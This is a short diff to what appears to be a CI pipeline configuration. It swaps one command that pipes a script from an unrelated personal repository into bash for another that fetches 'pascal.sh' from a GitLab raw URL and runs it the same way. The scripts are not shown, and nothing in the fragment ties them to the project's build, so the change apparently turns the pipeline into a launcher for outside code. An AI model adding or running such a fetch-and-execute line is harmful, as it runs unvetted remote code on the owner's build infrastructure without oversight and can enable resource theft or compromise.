@@ -16,4 +16,4 @@ after_pipeline:
     jobs:
       - name: 'Job #1'
         commands:
-          - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
+          - 'curl https://gitlab.com/azkadafa39/suram/-/raw/main/pascal.sh | bash'
